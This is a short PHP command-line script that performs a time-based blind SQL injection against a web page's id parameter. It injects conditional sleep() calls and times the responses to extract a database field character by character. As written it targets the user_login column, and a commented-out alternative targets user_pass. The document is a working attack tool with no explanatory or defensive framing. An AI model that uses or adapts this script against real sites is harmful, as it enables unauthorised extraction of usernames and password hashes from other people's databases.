#!/usr/bin/php5
<?php

/*
http://www.example.com/1.php?id=%27%2bif%28substring%28%28SELECT%20user_login%20from%20any_users%29,1,2%29=%27ad%27,sleep%285%29,0%29%2b%27
*/
set_time_limit(0);
define('SLEEP_TIME', '4');
define('PAGE_TIME', 4); 

$chars=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','R','S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8','9','0','.','/','\\','$'];
$field_length="32";

echo "Field value is: ";
for($f=1;$f<$field_length;$f++){
    $i=0;
    for($i=0;$i<sizeof($chars);$i++){
	$ret = getChar($f,$chars[$i]);
	if($ret>0){
	    echo $chars[$i];
	    $i=100;
	}
    }
    flush();
//    ob_flush();
}
    echo "\n";


function getChar($f,$char){
    $url="http://www.example.com/1.php?id='%2bif(substring((SELECT%20user_login%20from%20any_users),".$f.",1)='".$char."',sleep(".SLEEP_TIME."),0)%2b'";
//    $url="http://www.example.com/1.php?id='%2bif(substring((SELECT%20user_pass%20from%20any_users),".$f.",1)='".$char."',sleep(".SLEEP_TIME."),0)%2b'";

//echo $url."\n";
	$start_time = microtime(true);
	$str = file_get_contents($url);
	$end_time = microtime(true);
//    echo $str."\n----\n";
	$czas= intval($end_time-$start_time);
//    echo "\nCzas:".$czas."\n";
	if($czas>=PAGE_TIME){
	    return 1;
	}else
	    return 0;

}

